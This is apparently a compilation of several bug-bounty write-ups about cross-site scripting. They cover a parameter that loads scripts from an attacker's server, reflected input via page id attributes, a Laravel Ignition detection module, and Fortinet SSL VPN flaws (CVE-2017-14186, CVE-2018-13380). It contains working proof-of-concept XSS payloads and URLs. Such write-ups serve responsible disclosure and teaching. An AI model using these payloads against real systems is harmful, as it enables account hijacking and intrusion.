# |||||||||||||||||||||||||||||||||||||||||||||||||||||


i get this endpoint by using [waymore](https://github.com/xnl-h4ck3r/waymore) + [katana](https://github.com/projectdiscovery/katana), in results i see endpoint that contain this interested parameter `elementsUrl` i try in it my burp collaborator then i see that i received DNS & HTTP requests to this endpoints

**/styles.css**  
**/deployment/env/redacted.config.js**

![](https://miro.medium.com/v2/resize:fit:700/1*RNW2tkyLuQM3vzDt1yeazg.jpeg)

the requests commes just when i browse the url from my browser that’s mean there is no ssrf then i try to read source of the page and i see some interested js codes

![](https://miro.medium.com/v2/resize:fit:700/1*iDO8kwNsoa1KZOcIujnzMA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*CeO-w1Ql22L32J8BY3KnEQ.png)

i see that the page import js and css from external endpoint

i go to my server and i created two endpoints

**styles.css** :

body::before {  
  content: "HELLO FROM MCHKLT";  
  color: red;  
  font-size: 24px;  
  font-weight: bold;  
  display: block;  
  text-align: center;  
  margin-top: 20px;  
}

**/deployment/env/redacted.config.js** :

document.title = "HELLO FROM MCHKLT";  
alert(document.domain);

after adding my website to the vulnerable endpoint was like

`[http://target/v2/sso.php?env=redacted&elementsUrl=https://mchklt.server/](http://target/v2/sso.php?env=redacted&elementsUrl=https%3A%2F%2Fmchklt.server%2F)`

the site gonna import css and js from malicious endpoint that created by me

then boom

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Inspect the source code of this page for get “id” attributes.

![](https://miro.medium.com/v2/resize:fit:657/1*51F0KuwLJMwEHMU8OP_ZJQ.jpeg)

Testing them as GET parameters, like adding “helloworld” to the URL, can reveal reflected input in the error message div — a potential XSS vulnerability.

![](https://miro.medium.com/v2/resize:fit:700/1*swS2B1mWvD5UdXoopY54qQ.jpeg)

then i try simple xss payload and it works good

![](https://miro.medium.com/v2/resize:fit:700/1*1WZF6sdHNwtvH9nXiPdJ1Q.png)

by allah bless and this trick i got a valid rxss:
# |||||||||||||||||||||||||||||||||||||||||||||||||||||


# What is the “Laravel Ignition — Cross-Site Scripting” module?

The “Laravel Ignition — Cross-Site Scripting” module is designed to detect a cross-site scripting vulnerability in Laravel Ignition when debug mode is enabled. Laravel Ignition is a debugging dashboard specifically built for Laravel applications. This module focuses on identifying and reporting the presence of a high-severity cross-site scripting vulnerability in Laravel Ignition.

![](https://miro.medium.com/v2/resize:fit:650/1*Q_HS0AgKCrbYBwK7thLlyQ.png)

# |||||||||||||||||||||||||||||||||||||||||||||||||||||

During enumeration i noticed that **Fortinet SSL VPN web portal** is running on the affected url.

![](https://miro.medium.com/v2/resize:fit:700/0*O3NHQj5-_LfbCOPB.png)

Fortinet-FortiGate

Then, Manually browsed the url and guessed from the url parameter looks like a **Fortinet SSL VPN web portal** in which most of the web content are removed to identify it easily.

![](https://miro.medium.com/v2/resize:fit:700/0*soKOSQlNIQaFiYvW.png)

Fortinet SSL web portal

In further enumeration and looked for known vulnerabilities which can be used to exploit this Fortinet SSL VPN web portal, I identified that this web portal is vulnerable to **CVE-2017–14186** and **CVE-2018–13380** in multiple parameters.

Then i tried to trigger the XSS in the affected URL against the above mentioned **CVEs** and it was successful.

# 1st Param:

https://<target.com>/remote/loginredir?redir=javascript:alert(document.domain)

**Payload:** **javascript:alert(document.domain)**

![](https://miro.medium.com/v2/resize:fit:700/0*MKbnkyXzlmdQq5oH.png)

document.domain

# 2nd Param:

https://<target.com>/message?title=x&msg=%26%23%3Csvg/onload=alert(“XSS_Triggered”)  
%3E%3B

**Payload: %26%23%3Csvg/onload=alert(“XSS_Triggered”)  
%3E%3B ==> _&#<svg/onload=alert(“XSS_Triggered”)  
>;_**

![](https://miro.medium.com/v2/resize:fit:700/0*4ItGGtqUCXIdakdn.png)

Xss_Triggered

# 3rd Param:

https://<target.com>/remote/error?errmsg=**ABABAB — %3E%3Cscript%3Ealert(“XSS_Triggered”)%3C/script%3E** ==> **ABABAB-><script>alert(“XSS_Triggered”)</script>**

**Payload: ABABAB-><script>alert(“XSS_Triggered”)</script>**

![](https://miro.medium.com/v2/resize:fit:700/0*rzDsM6ntYo9WkdgB.png)

Xss_Triggered

So that’s the way i find XSS and reported it to the Team.
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||
